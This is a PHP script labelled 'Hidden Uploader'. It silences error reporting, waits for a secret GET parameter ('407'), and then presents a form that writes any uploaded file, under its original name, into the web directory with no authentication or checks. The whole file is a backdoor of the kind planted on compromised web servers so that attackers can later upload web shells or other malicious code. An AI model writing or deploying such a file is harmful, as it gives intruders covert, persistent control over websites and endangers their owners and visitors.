<?php 
error_reporting(0);
set_time_limit(0);
@session_start();
@set_time_limit(0);

if(isset($_GET['407']))
{
	
echo "
<body>
<font color=black size=3>";
echo "<center><h1>Hidden Uploader</h1><br/><h2></h2></center><br/>";
echo "<center><form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\">Filename:</label>
<input type=\"file\" name=\"file\" id=\"file\"/>
<br/><br/>
<input type=\"submit\" name=\"submit\" value=\"UPLOAD\">
</form></center>";
if ($_FILES["file"]["error"] > 0)
{
echo "Error: " . $_FILES["file"]["error"] . "<br/>";
}
else
{
echo "Upload: " . $_FILES["file"]["name"] . "<br/>";
echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br/>";
echo "Stored in: " . $_FILES["file"]["tmp_name"];
}
if (file_exists("" . $_FILES["file"]["name"]))
{
echo $_FILES["file"]["name"] . " already exists. ";
}
else
{
move_uploaded_file($_FILES["file"]["tmp_name"],
"" . $_FILES["file"]["name"]);
echo "Stored in: " . "" . $_FILES["file"]["name"];
}
}

?>
